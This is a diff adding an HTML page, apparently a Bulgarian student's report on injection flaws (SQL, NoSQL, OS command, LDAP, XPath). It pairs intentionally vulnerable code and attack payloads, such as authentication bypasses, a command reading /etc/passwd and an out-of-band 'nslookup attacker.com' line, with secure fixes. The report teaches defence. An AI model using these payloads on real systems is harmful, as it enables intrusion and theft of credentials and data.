@@ -1,0 +1,1064 @@
+<!DOCTYPE html>
+<html lang="bg">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Уязвимости в уеб приложения - инжекции (OWASP-A1)</title>
+    <link rel="stylesheet" href="css/site.css">
+</head>
+
+<body>
+    <header>
+        <h1>Уязвимости в уеб приложения - инжекции (OWASP-A1)</h1>
+        <p>Типове, примери и превенция</p>
+        <p>Даниел Василев, КН1, 0MI0800247</p>
+    </header>
+
+    <article>
+        <section>
+            <h2>1. Въведение</h2>
+            <p>Атаките чрез инжектиране (<em>injection attacks</em>) представляват най-сериозната заплаха за уеб
+                приложенията според класацията OWASP Top 10. В актуалната версия от 2021 година, инжекциите са
+                класифицирани като A03, но исторически са заемали първата позиция (A1) в класацията от 2017 година. Тези
+                атаки възникват, когато недоверени данни се изпращат към интерпретатор като част от команда или заявка,
+                което позволява на атакуващия да изпълни злонамерени към уеб приложението команди или да получи достъп
+                до неоторизирани данни.
+            </p>
+
+            <p>Инжекционните уязвимости се появяват когато:</p>
+            <ul>
+                <li>Данните от потребителя не се валидират, филтрират или санитизират адекватно</li>
+                <li>Динамични заявки или команди без контекстно-зависим <em>escaping</em> се използват директно в
+                    интерпретатора</li>
+                <li>Враждебни данни се използват в параметри за търсене на ORM (<em>Object-Relational Mapping</em>), за
+                    да извлекат допълнителни чувствителни записи</li>
+            </ul>
+
+            <div class="warning">
+                <strong>Важно:</strong> Инжекционните атаки могат да доведат до загуба на данни, компрометиране на
+                системата, отказ на услуга (<em>Denial of Service</em>) и пълно поемане на контрола върху сървъра.
+            </div>
+
+            <div class="reference">
+                <strong>Източник:</strong> OWASP Foundation. (2021). <em>A03 Injection - OWASP Top 10:2021</em>.
+                Достъпно на: <a
+                    href="https://owasp.org/Top10/A03_2021-Injection/">https://owasp.org/Top10/A03_2021-Injection/</a>
+            </div>
+        </section>
+
+        <section>
+            <h2>2. SQL Injection (SQLi)</h2>
+
+            <h3>2.1. Описание</h3>
+            <p>SQL инжекцията е уязвимост в сигурността на уеб приложенията, която позволява на атакуващ да манипулира
+                SQL заявките, които приложението изпраща към базата данни. Това може да позволи на атакуващия да види
+                данни, които обикновено не е в състояние да извлече, включително данни на други потребители или каквито
+                и да е данни, до които приложението има достъп.</p>
+
+            <p>SQL инжекцията възниква когато:</p>
+            <ul>
+                <li>Потребителският вход (<em>input</em>) се комбинира директно със SQL команди чрез конкатенация на
+                    стрингове
+                </li>
+                <li>Липсва адекватна валидация и санитизация на входните данни</li>
+                <li>Не се използват параметризирани заявки (<em>prepared statements</em>)</li>
+            </ul>
+
+            <h3>2.2. Пример за уязвим код</h3>
+            <figure>
+                <figcaption><strong>Програмен код 1:</strong> Уязвим PHP код за SQL инжекция</figcaption>
+                <pre><code>// Взимане на входни данни директно от URL параметър (?category=...)
+$category = $_GET['category'];
+// Липсва валидация / филтриране на входа
+
+// Сглобяване на SQL заявка чрез конкатенация на стринг
+$query = "SELECT * FROM products WHERE category = '$category'";
+// Ако в $category има ', OR, -- и др., те стават част от SQL заявката
+// Това позволява SQL Injection
+
+// Изпълнение на заявката без защита (prepared statements)
+$result = mysqli_query($connection, $query);
+// Злонамерен вход може да промени логиката на заявката</code></pre>
+            </figure>
+
+            <h3>2.3. Пример за атака</h3>
+            <p>Атакуващият може да използва следния <em>payload</em> в URL параметъра:</p>
+            <figure>
+                <figcaption><strong>Програмен код 2:</strong> SQL инжекция атака</figcaption>
+                <pre><code>https://example.com/products?category=Gifts'+OR+1=1--
+
+Резултатна SQL заявка:
+SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
+
+Обяснение:
+- ' прекъсва стринга
+- OR 1=1 създава условие, което винаги е истина
+- -- коментира остатъка от заявката</code></pre>
+            </figure>
+
+            <h3>2.4. Типове SQL инжекции</h3>
+            <figure>
+                <figcaption><strong>Таблица 1:</strong></figcaption>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Тип</th>
+                            <th>Описание</th>
+                            <th>Характеристика</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><strong>In-band SQLi</strong></td>
+                            <td>Атакуващият използва същия канал за атака и получаване на резултати</td>
+                            <td>Най-лесен за експлоатация</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Error-based SQLi</strong></td>
+                            <td>Използва съобщенията за грешки от базата данни</td>
+                            <td>Разкрива структурата на базата</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Union-based SQLi</strong></td>
+                            <td>Използва UNION оператор за комбиниране на резултати</td>
+                            <td>Извлича данни от други таблици</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Blind SQLi</strong></td>
+                            <td>Приложението не връща данни или грешки директно</td>
+                            <td>По-труден за експлоатация</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Time-based Blind SQLi</strong></td>
+                            <td>Използва времеви закъснения за извличане на информация</td>
+                            <td>Изисква повече заявки</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </figure>
+            <h3>2.5. Превенция</h3>
+            <p>Най-ефективният начин за предотвратяване на SQL инжекции е използването на параметризирани заявки:</p>
+            <figure>
+                <figcaption><strong>Програмен код 3:</strong> Защитен код с параметризирани заявки</figcaption>
+                <pre><code>// Защитен код с Prepared Statements (PHP)
+
+// Взимане на вход от потребителя
+$category = $_GET['category'];
+
+// Подготовка на SQL заявка с placeholder (?)
+// Данните няма да се интерпретират като част от SQL синтаксиса
+$stmt = $connection->prepare("SELECT * FROM products WHERE category = ?");
+
+// Свързване на параметъра като стринг
+$stmt->bind_param("s", $category);
+
+// Изпълнение на заявката
+$stmt->execute();
+
+// Получаване на резултата
+$result = $stmt->get_result();</code></pre>
+            </figure>
+
+            <div class="info">
+                <strong>Препоръки за превенция:</strong>
+                <ul>
+                    <li>Използвайте параметризирани заявки (<em>prepared statements</em>)</li>
+                    <li>Приложете <em>whitelist</em> валидация на входните данни</li>
+                    <li>Използвайте ORM (<em>Object-Relational Mapping</em>) библиотеки</li>
+                    <li>Ограничете правата на базата данни до минимално необходимите</li>
+                    <li>Избягвайте динамични SQL заявки с конкатенация на стрингове</li>
+                </ul>
+            </div>
+
+            <div class="reference">
+                <strong>Източници:</strong><br>
+                PortSwigger. (n.d.). <em>SQL injection</em>. Достъпно на: <a
+                    href="https://portswigger.net/web-security/sql-injection">https://portswigger.net/web-security/sql-injection</a><br>
+                OWASP Foundation. (2017). <em>A1:2017-Injection</em>. Достъпно на: <a
+                    href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">https://owasp.org/www-project-top-ten/2017/A1_2017-Injection</a>
+            </div>
+        </section>
+
+        <section>
+            <h2>3. NoSQL Injection</h2>
+
+            <h3>3.1. Описание</h3>
+            <p>NoSQL инжекцията е уязвимост подобна на SQL инжекцията, но насочена към NoSQL бази данни като MongoDB,
+                Cassandra, CouchDB и др. Тези бази данни използват различни езици за заявки (често JSON-базирани) и
+                нямат универсален стандарт като SQL. NoSQL инжекциите могат да бъдат дори по-опасни от SQL инжекциите,
+                тъй като някои NoSQL системи позволяват изпълнение на JavaScript код директно в базата данни.</p>
+
+            <h3>3.2. Пример за уязвим код</h3>
+            <figure>
+                <figcaption><strong>Програмен код 4:</strong> Уязвим Node.js код за MongoDB инжекция</figcaption>
+                <pre><code>// Уязвим код (Node.js + MongoDB)
+app.post('/login', (req, res) => {
+    // Входни данни директно от заявката
+    const username = req.body.username;
+    const password = req.body.password;
+    // Липсва валидация и филтриране на входа
+
+    // Обектът се използва директно в MongoDB заявка
+    // Това позволява NoSQL Injection (напр. чрез оператори като $ne)
+    db.collection('users').findOne({
+        username: username,
+        password: password
+    }, (err, user) => {
+        if (user) {
+            res.send('Login successful');
+        } else {
+            res.send('Login failed');
+        }
+    });
+});</code></pre>
+            </figure>
+
+            <h3>3.3. Пример за атака</h3>
+            <p>Атакуващият може да изпрати JSON <em>payload</em> с MongoDB оператори:</p>
+            <figure>
+                <figcaption><strong>Програмен код 5:</strong> NoSQL инжекция атака</figcaption>
+                <pre><code>// Атака чрез JSON payload
+// Подаване на обекти вместо стрингове
+POST /login
+Content-Type: application/json
+
+{
+    "username": {"$ne": null},
+    "password": {"$ne": null}
+}
+
+Обяснение:
+- $ne е MongoDB оператор, означаващ "not equal"
+- {"$ne": null} винаги връща истина за всеки потребител
+- Това заобикаля аутентикацията</code></pre>
+            </figure>
+
+            <h3>3.4. Типове NoSQL инжекции</h3>
+            <ul>
+                <li><strong>Syntax Injection</strong> - Манипулиране на синтаксиса на заявката чрез специални символи
+                </li>
+                <li><strong>Operator Injection</strong> - Използване на NoSQL оператори като $where, $ne, $gt, $regex
+                </li>
+                <li><strong>JavaScript Injection</strong> - Инжектиране на JavaScript код в $where оператора (MongoDB)
+                </li>
+                <li><strong>Blind NoSQL Injection</strong> - Извличане на информация чрез булеви условия без директна
+                    обратна връзка</li>
+            </ul>
+
+            <h3>3.5. Пример с $where оператор</h3>
+            <figure>
+                <figcaption><strong>Програмен код 6:</strong> JavaScript инжекция в MongoDB $where оператор</figcaption>
+                <pre><code>// Опасен $where оператор
+db.collection.find({
+    $where: "this.name === '" + userInput + "'"
+});
+
+// Атака с безкраен цикъл (DoS)
+userInput = "'; while(true){}; var dummy='"
+
+// Резултатна заявка:
+$where: "this.name === ''; while(true){}; var dummy=''"</code></pre>
+            </figure>
+
+            <h3>3.6. Превенция</h3>
+            <figure>
+                <figcaption><strong>Програмен код 7:</strong> Защитен код за NoSQL</figcaption>
+                <pre><code>// Защитен код (Node.js + MongoDB)
+app.post('/login', (req, res) => {
+    // Принудително преобразуване към стринг
+    // Това предотвратява подаване на обекти с MongoDB оператори
+    const username = String(req.body.username);
+    const password = String(req.body.password);
+
+    // Използване на findOne с конкретни стойности
+    // Данните не се интерпретират като част от заявката
+    db.collection('users').findOne({
+        username: username,
+        password: password
+    }, (err, user) => {
+        if (user) {
+            res.send('Login successful');
+        } else {
+            res.send('Login failed');
+        }
+    });
+});</code></pre>
+            </figure>
+
+            <div class="info">
+                <strong>Препоръки за превенция:</strong>
+                <ul>
+                    <li>Валидирайте и приведете типовете на входните данни</li>
+                    <li>Избягвайте $where оператора - използвайте по-безопасни алтернативи</li>
+                    <li>Използвайте <em>whitelist</em> валидация за позволени полета</li>
+                    <li>При MongoDB, настройте javascriptEnabled на false в mongod.conf</li>
+                    <li>Използвайте специализирани библиотеки за санитизация като mongo-sanitize</li>
+                </ul>
+            </div>
+
+            <div class="reference">
+                <strong>Източници:</strong><br>
+                PortSwigger. (n.d.). <em>NoSQL injection</em>. Достъпно на: <a
+                    href="https://portswigger.net/web-security/nosql-injection">https://portswigger.net/web-security/nosql-injection</a><br>
+                Imperva. (2023). <em>What Is NoSQL Injection?</em>. Достъпно на: <a
+                    href="https://www.imperva.com/learn/application-security/nosql-injection/">https://www.imperva.com/learn/application-security/nosql-injection/</a>
+            </div>
+        </section>
+
+        <section>
+            <h2>4. OS Command Injection</h2>
+
+            <h3>4.1. Описание</h3>
+            <p>OS Command инжекцията (<em>Operating System Command Injection</em>) е уязвимост, която позволява на
+                атакуващия да изпълнява произволни команди на операционната система на сървъра чрез уязвимо приложение.
+                Тази атака е възможна, когато приложението извиква системни команди с потребителски данни без адекватна
+                валидация. Атакуващият може да инсталира <em>backdoor</em>, да извлече чувствителни данни или да
+                компрометира изцяло системата.</p>
+
+            <h3>4.2. Пример за уязвим код</h3>
+            <figure>
+                <figcaption><strong>Програмен код 8:</strong> Уязвим PHP код за OS Command инжекция</figcaption>
+                <pre><code>// Уязвим код (PHP)
+
+// Входни данни директно от URL параметър
+$ip = $_GET['ip'];
+// Липсва валидация и филтриране на входа
+
+// Потребителският вход се добавя директно към shell команда
+// Това позволява command injection
+$output = shell_exec("ping -c 4 " . $ip);
+
+// Отпечатване на резултата
+echo "$output";</code></pre>
+            </figure>
+
+            <h3>4.3. Пример за атака</h3>
+            <figure>
+                <figcaption><strong>Програмен код 9:</strong> OS Command инжекция атаки</figcaption>
+                <pre><code>// Атака 1: Използване на ; (semicolon) за разделяне на команди
+https://example.com/ping?ip=8.8.8.8;cat /etc/passwd
+
+Резултатна команда:
+ping -c 4 8.8.8.8;cat /etc/passwd
+
+// Атака 2: Използване на && (logical AND)
+https://example.com/ping?ip=8.8.8.8 && whoami
+
+// Атака 3: Използване на | (pipe)
+https://example.com/ping?ip=8.8.8.8 | ls -la
+
+// Атака 4: Използване на ` (backticks) за command substitution
+https://example.com/ping?ip=`cat /etc/passwd`</code></pre>
+            </figure>
+
+            <h3>4.4. Метахарактери за команди</h3>
+            <figure>
+                <figcaption><strong>Таблица 2:</strong></figcaption>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Символ</th>
+                            <th>ОС</th>
+                            <th>Функция</th>
+                            <th>Пример</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>;</td>
+                            <td>Unix/Linux</td>
+                            <td>Разделител на команди</td>
+                            <td>cmd1; cmd2</td>
+                        </tr>
+                        <tr>
+                            <td>&</td>
+                            <td>Unix/Linux/Windows</td>
+                            <td>Изпълнява команда във фонов режим</td>
+                            <td>cmd1 & cmd2</td>
+                        </tr>
+                        <tr>
+                            <td>&&</td>
+                            <td>Unix/Linux/Windows</td>
+                            <td>Изпълнява втора команда ако първата успее</td>
+                            <td>cmd1 && cmd2</td>
+                        </tr>
+                        <tr>
+                            <td>||</td>
+                            <td>Unix/Linux/Windows</td>
+                            <td>Изпълнява втора команда ако първата се провали</td>
+                            <td>cmd1 || cmd2</td>
+                        </tr>
+                        <tr>
+                            <td>|</td>
+                            <td>Unix/Linux/Windows</td>
+                            <td><em>Pipe</em> - препраща изхода към следващата команда</td>
+                            <td>cmd1 | cmd2</td>
+                        </tr>
+                        <tr>
+                            <td>`</td>
+                            <td>Unix/Linux</td>
+                            <td><em>Command substitution</em></td>
+                            <td>echo `whoami`</td>
+                        </tr>
+                        <tr>
+                            <td>$(...)</td>
+                            <td>Unix/Linux</td>
+                            <td><em>Command substitution</em></td>
+                            <td>echo $(whoami)</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </figure>
+            <h3>4.5. Blind Command Injection</h3>
+            <p><em>Blind Command Injection</em> възниква когато приложението не връща резултата от командата в отговора.
+                Атакуващият може да използва различни техники:</p>
+            <ul>
+                <li><strong>Time delays</strong> - Използване на sleep или ping за забавяне на отговора</li>
+                <li><strong>Output redirection</strong> - Препращане на изхода към файл, който може да се достъпи</li>
+                <li><strong>Out-of-band (OAST)</strong> - Изпращане на данни към външен сървър контролиран от атакуващия
+                </li>
+            </ul>
+
+            <figure>
+                <figcaption><strong>Програмен код 10:</strong> Blind Command Injection с time delay</figcaption>
+                <pre><code>// Time-based blind injection
+https://example.com/ping?ip=8.8.8.8 || sleep 10
+
+// Out-of-band injection (Linux)
+https://example.com/ping?ip=8.8.8.8 || nslookup attacker.com</code></pre>
+            </figure>
+
+            <h3>4.6. Превенция</h3>
+            <figure>
+                <figcaption><strong>Програмен код 11:</strong> Защитен код за предотвратяване на OS Command инжекция
+                </figcaption>
+                <pre><code>// Защитен код (PHP)
+// Опция 1: Използване на вградени PHP функции вместо системни команди
+
+// Входни данни от URL параметър
+$ip = $_GET['ip'];
+
+// Проверка дали входът е валиден IP адрес
+if (filter_var($ip, FILTER_VALIDATE_IP)) {
+
+    // Използване на PHP логика вместо shell команда
+    // Избягва се command injection
+    if (ping($ip)) {
+        echo "Host is reachable";
+    }
+
+} else {
+    echo "Invalid IP address";
+}
+
+// Опция 2: Whitelist валидация + escape на аргумента
+
+// Входни данни от URL параметър
+$ip = $_GET['ip'];
+
+// Проверка дали форматът отговаря на IPv4
+if (preg_match('/^[0-9]{1,3}(\.[0-9]{1,3}){3}$/', $ip)) {
+
+    // Escape-ване на аргумента преди подаване към shell
+    $safe_ip = escapeshellarg($ip);
+
+    // Изпълнение на командата с вече безопасен аргумент
+    $output = shell_exec("ping -c 4 " . $safe_ip);
+
+    // Извеждане на резултата
+    echo "$output";
+
+}</code></pre>
+            </figure>
+
+            <div class="warning">
+                <strong>Важно:</strong> Най-добрата защита е да се избягват системни команди изцяло и да се използват
+                вградени функции или библиотеки на езика за програмиране.
+            </div>
+
+            <div class="info">
+                <strong>Препоръки за превенция:</strong>
+                <ul>
+                    <li>Избягвайте извикването на системни команди, когато е възможно</li>
+                    <li>Използвайте <em>whitelist</em> валидация на разрешени стойности</li>
+                    <li>Валидирайте, че входните данни съдържат само алфанумерични символи</li>
+                    <li>Използвайте escapeshellarg() и escapeshellcmd() функции</li>
+                    <li>Прилагайте принципа на най-малките привилегии при изпълнение на процеси</li>
+                    <li>Използвайте <em>parameterized APIs</em>, когато е възможно</li>
+                </ul>
+            </div>
+
+            <div class="reference">
+                <strong>Източници:</strong><br>
+                PortSwigger. (n.d.). <em>OS command injection</em>. Достъпно на: <a
+                    href="https://portswigger.net/web-security/os-command-injection">https://portswigger.net/web-security/os-command-injection</a><br>
+                OWASP Foundation. (n.d.). <em>Command Injection</em>. Достъпно на: <a
+                    href="https://owasp.org/www-community/attacks/Command_Injection">https://owasp.org/www-community/attacks/Command_Injection</a><br>
+                OWASP Cheat Sheet Series. (n.d.). <em>OS Command Injection Defense</em>. Достъпно на: <a
+                    href="https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html</a>
+            </div>
+        </section>
+
+        <section>
+            <h2>5. LDAP Injection</h2>
+
+            <h3>5.1. Описание</h3>
+            <p>LDAP (<em>Lightweight Directory Access Protocol</em>) инжекцията е атака, която експлоатира уеб
+                приложения, които конструират LDAP заявки базирани на потребителски вход. LDAP се използва за
+                аутентикация, оторизация и съхранение на информация за потребители в директорийни услуги като Active
+                Directory. Когато приложението не санитизира правилно потребителския вход, атакуващият може да
+                модифицира LDAP заявките и да получи неоторизиран достъп.</p>
+
+            <h3>5.2. Структура на LDAP заявка</h3>
+            <p>LDAP използва префиксна нотация за заявки. Пример за базова LDAP заявка:</p>
+            <figure>
+                <figcaption><strong>Програмен код 12:</strong> Структура на LDAP заявка</figcaption>
+                <pre><code>// Базова LDAP заявка за аутентикация
+(&(uid=username)(userPassword=password))
+
+Обяснение:
+- & означава логическо AND
+- uid е атрибутът за потребителско име
+- userPassword е атрибутът за парола
+- Заявката търси потребител с дадените uid и password</code></pre>
+            </figure>
+
+            <h3>5.3. Пример за уязвим код</h3>
+            <figure>
+                <figcaption><strong>Програмен код 13:</strong> Уязвим код за LDAP инжекция</figcaption>
+                <pre><code>// Уязвим код (Java)
+
+// Входни данни директно от HTTP заявка
+String userName = request.getParameter("user");
+String password = request.getParameter("pass");
+
+// LDAP филтър, сглобен чрез конкатенация
+// Потребителският вход става част от LDAP синтаксиса
+String filter = "(&(uid=" + userName + ")(userPassword=" + password + "))";
+
+// Изпълнение на LDAP търсене с незащитен филтър
+// Това позволява LDAP Injection
+DirContext ctx = new InitialDirContext(env);
+NamingEnumeration results = ctx.search(
+        "ou=users,dc=example,dc=com",
+        filter,
+        searchCtls);</code></pre>
+            </figure>
+
+            <h3>5.4. Пример за атака - Заобикаляне на аутентикация</h3>
+            <figure>
+                <figcaption><strong>Програмен код 14:</strong> LDAP инжекция за заобикаляне на аутентикация</figcaption>
+                <pre><code>// Атака 1: Използване на wildcard (*)
+Username: admin)(&))
+Password: [произволна стойност]
+
+Резултатна заявка:
+(&(uid=admin)(&))(userPassword=[произволна]))
+
+// LDAP обработва само първия филтър: (&(uid=admin)(&))
+// Второто условие (&) винаги е истина
+
+
+// Атака 2: Използване на OR (|) оператор  
+Username: *)(uid=*))(|(uid=*
+Password: [произволна стойност]
+
+Резултатна заявка:
+(&(uid=*)(uid=*))(|(uid=*)(userPassword=[произволна]))
+
+// Връща всички потребители</code></pre>
+            </figure>
+
+            <h3>5.5. Типове LDAP инжекции</h3>
+            <figure>
+                <figcaption><strong>Таблица 3:</strong> Типове LDAP инжекции</figcaption>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Тип</th>
+                            <th>Описание</th>
+                            <th>Цел</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><strong>AND Injection</strong></td>
+                            <td>Използва & оператор за добавяне на условия</td>
+                            <td>Модификация на логиката на заявката</td>
+                        </tr>
+                        <tr>
+                            <td><strong>OR Injection</strong></td>
+                            <td>Използва | оператор за създаване на алтернативни условия</td>
+                            <td>Извличане на повече данни</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Blind LDAP Injection</strong></td>
+                            <td>Извличане на информация чрез True/False отговори</td>
+                            <td>Извличане на данни без директна обратна връзка</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </figure>
+            <h3>5.6. Blind LDAP Injection</h3>
+            <p><em>Blind LDAP Injection</em> се използва когато приложението не връща грешки или данни директно, но
+                атакуващият може да извлече информация чрез анализиране на поведението на приложението:</p>
+            <figure>
+                <figcaption><strong>Програмен код 15:</strong> Blind LDAP Injection пример</figcaption>
+                <pre><code>// Проверка дали паролата на admin започва с 'a'
+Username: admin)(password=a*)
+Password: *
+
+// Ако аутентикацията успее, първата буква е 'a'
+// Ако се провали, първата буква е различна
+
+// Итеративно извличане на паролата символ по символ
+admin)(password=ab*)
+admin)(password=abc*)
+...</code></pre>
+            </figure>
+
+            <h3>5.7. Превенция</h3>
+            <figure>
+                <figcaption><strong>Програмен код 16:</strong> Защитен код за LDAP</figcaption>
+                <pre><code>// Защитен код (Java) с escape на специални символи
+
+// Метод за escape-ване на специални LDAP символи
+// Превръща ги в безопасен текстов формат
+public String escapeLDAPSearchFilter(String filter) {
+    StringBuilder sb = new StringBuilder();
+    for (int i = 0; i < filter.length(); i++) {
+        char curChar = filter.charAt(i);
+        switch (curChar) {
+            case '\\':
+                sb.append("\\5c");
+                break;
+            case '*':
+                sb.append("\\2a");
+                break;
+            case '(':
+                sb.append("\\28");
+                break;
+            case ')':
+                sb.append("\\29");
+                break;
+            case '\u0000':
+                sb.append("\\00");
+                break;
+            default:
+                sb.append(curChar);
+        }
+    }
+    return sb.toString();
+}
+
+// Използване на escape-натите стойности
+
+// Обработка на потребителските данни преди създаване на филтъра
+String safeUserName = escapeLDAPSearchFilter(userName);
+String safePassword = escapeLDAPSearchFilter(password);
+
+// Сглобяване на LDAP филтър със защитени стойности
+// Входът вече не може да промени логиката на заявката
+String filter = "(&(uid=" + safeUserName + ")(userPassword=" + safePassword + "))";</code></pre>
+            </figure>
+
+            <div class="info">
+                <strong>Препоръки за превенция:</strong>
+                <ul>
+                    <li>Използвайте параметризирани LDAP заявки, когато са налични</li>
+                    <li>Escape-вайте специални LDAP символи: (, ), *, \, null</li>
+                    <li>Прилагайте <em>whitelist</em> валидация на входните данни</li>
+                    <li>Използвайте LDAP библиотеки с вградена защита</li>
+                    <li>Ограничете правата на LDAP акаунта използван от приложението</li>
+                    <li>Използвайте <em>bind authentication</em>, когато е възможно</li>
+                </ul>
+            </div>
+
+            <div class="reference">
+                <strong>Източници:</strong><br>
+                Imperva. (n.d.). <em>What is LDAP Injection</em>. Достъпно на: <a
+                    href="https://www.imperva.com/learn/application-security/ldap-injection/">https://www.imperva.com/learn/application-security/ldap-injection/</a><br>
+                OWASP Foundation. (n.d.). <em>LDAP Injection</em>. Достъпно на: <a
+                    href="https://owasp.org/www-community/attacks/LDAP_Injection">https://owasp.org/www-community/attacks/LDAP_Injection</a><br>
+                OWASP Cheat Sheet Series. (n.d.). <em>LDAP Injection Prevention</em>. Достъпно на: <a
+                    href="https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html</a>
+            </div>
+        </section>
+
+        <section>
+            <h2>6. XPath Injection</h2>
+
+            <h3>6.1. Описание</h3>
+            <p>XPath (<em>XML Path Language</em>) инжекцията е атака насочена към приложения, които използват XPath
+                заявки за навигация и извличане на данни от XML документи. XPath е език за заявки подобен на SQL, но за
+                XML структури. За разлика от SQL, XPath няма нива на достъп или потребителска аутентикация, което
+                означава че успешна атака може да разкрие целия XML документ.</p>
+
+            <h3>6.2. Пример за XML документ</h3>
+            <figure>
+                <figcaption><strong>Програмен код 17:</strong> Примерен XML документ с потребителски данни</figcaption>
+                <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;users&gt;
+    &lt;user&gt;
+        &lt;username&gt;admin&lt;/username&gt;
+        &lt;password&gt;secretPass123&lt;/password&gt;
+        &lt;role&gt;administrator&lt;/role&gt;
+    &lt;/user&gt;
+    &lt;user&gt;
+        &lt;username&gt;john&lt;/username&gt;
+        &lt;password&gt;myPassword456&lt;/password&gt;
+        &lt;role&gt;user&lt;/role&gt;
+    &lt;/user&gt;
+&lt;/users&gt;</code></pre>
+            </figure>
+
+            <h3>6.3. Пример за уязвим код</h3>
+            <figure>
+                <figcaption><strong>Програмен код 18:</strong> Уязвим код за XPath инжекция</figcaption>
+                <pre><code>// Уязвим код (Java)
+
+// Входни данни директно от HTTP заявка
+String username = request.getParameter("username");
+String password = request.getParameter("password");
+
+// XPath заявка, сглобена чрез конкатенация на стрингове
+// Потребителският вход става част от XPath синтаксиса
+String xpathQuery = "//user[username/text()='" + username +
+                    "' and password/text()='" + password + "']";
+
+// Компилиране и изпълнение на незащитена XPath заявка
+// Това позволява XPath Injection
+XPathExpression expr = xpath.compile(xpathQuery);
+NodeList nodes = (NodeList) expr.evaluate(doc, XPathConstants.NODESET);</code></pre>
+            </figure>
+
+            <h3>6.4. Пример за атака</h3>
+            <figure>
+                <figcaption><strong>Програмен код 19:</strong> XPath инжекция атаки</figcaption>
+                <pre><code>// Атака 1: Заобикаляне на аутентикация с or true()
+Username: ' or true() or '
+Password: [произволна стойност]
+
+Резултатна XPath заявка:
+//user[username/text()='' or true() or '' 
+       and password/text()='anything']
+
+// Резултат: Връща първия потребител (обикновено admin)
+
+
+// Атака 2: Извличане на всички потребители
+Username: ' or 1=1 or '
+Password: ' or 1=1 or '
+
+Резултатна XPath заявка:
+//user[username/text()='' or 1=1 or '' 
+       and password/text()='' or 1=1 or '']
+
+// Резултат: Връща всички потребители
+
+
+// Атака 3: Използване на contains() за търсене
+Username: ' or contains(., "admin") or '
+Password: anything
+
+Резултатна XPath заявка:
+//user[username/text()='' or contains(., "admin") or '' 
+       and password/text()='anything']
+
+// Резултат: Връща потребители съдържащи "admin"</code></pre>
+            </figure>
+
+            <h3>6.5. Blind XPath Injection</h3>
+            <p><em>Blind XPath Injection</em> се използва за извличане на структурата и съдържанието на XML документа
+                символ по символ чрез булеви заявки:</p>
+            <figure>
+                <figcaption><strong>Програмен код 20:</strong> Blind XPath Injection техники</figcaption>
+                <pre><code>// Определяне на броя на потребителите
+Username: ' or count(//user)=2 or '
+Password: anything
+
+// Определяне на дължината на първата парола
+Username: ' or string-length(//user[1]/password)=13 or '
+Password: anything
+
+// Извличане на първия символ от паролата
+Username: ' or substring(//user[1]/password,1,1)="s" or '
+Password: anything
+
+// Ако горната заявка връща True, първият символ е "s"
+// Продължава се итеративно за всеки символ</code></pre>
+            </figure>
+
+            <h3>6.6. XPath функции използвани при атаки</h3>
+            <figure>
+                <figcaption><strong>Таблица 4:</strong></figcaption>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Функция</th>
+                            <th>Описание</th>
+                            <th>Пример</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>count()</td>
+                            <td>Връща броя на възлите</td>
+                            <td>count(//user)</td>
+                        </tr>
+                        <tr>
+                            <td>string-length()</td>
+                            <td>Връща дължината на стринг</td>
+                            <td>string-length(//user[1]/password)</td>
+                        </tr>
+                        <tr>
+                            <td>substring()</td>
+                            <td>Извлича подстринг</td>
+                            <td>substring(//user[1]/password,1,1)</td>
+                        </tr>
+                        <tr>
+                            <td>contains()</td>
+                            <td>Проверява дали съдържа текст</td>
+                            <td>contains(., "admin")</td>
+                        </tr>
+                        <tr>
+                            <td>position()</td>
+                            <td>Връща позицията на възела</td>
+                            <td>//user[position()=1]</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </figure>
+            <h3>6.7. Превенция</h3>
+            <figure>
+                <figcaption><strong>Програмен код 21:</strong> Защитен код за XPath</figcaption>
+                <pre><code>// Защитен код (Java) с параметризирани XPath заявки
+
+// Създаване на XPath обект
+XPath xpath = XPathFactory.newInstance().newXPath();
+
+// Дефиниране на променливи за заявката
+// Стойностите се подават отделно от самия XPath израз
+SimpleVariableResolver resolver = new SimpleVariableResolver();
+resolver.addVariable("username", username);
+resolver.addVariable("password", password);
+
+// Регистриране на resolver-а
+xpath.setXPathVariableResolver(resolver);
+
+// XPath заявка с променливи вместо директни стойности
+// Входът не може да промени логиката на заявката
+String xpathQuery = "//user[username/text()=$username and " +
+                    "password/text()=$password]";
+
+// Компилиране и изпълнение на защитена XPath заявка
+XPathExpression expr = xpath.compile(xpathQuery);
+NodeList nodes = (NodeList) expr.evaluate(doc, XPathConstants.NODESET);</code></pre>
+            </figure>
+
+            <div class="warning">
+                <strong>Внимание:</strong> XPath инжекциите могат да бъдат по-опасни от SQL инжекциите, защото XPath
+                няма контрол на достъпа и позволява достъп до целия XML документ.
+            </div>
+
+            <div class="info">
+                <strong>Препоръки за превенция:</strong>
+                <ul>
+                    <li>Използвайте параметризирани XPath заявки (<em>precompiled XPath queries</em>)</li>
+                    <li>Escape-вайте специални XPath символи: ', ", &lt;, &gt;, &amp;</li>
+                    <li>Валидирайте входните данни с <em>whitelist</em> подход</li>
+                    <li>Избягвайте директната конкатенация на потребителски вход в XPath изрази</li>
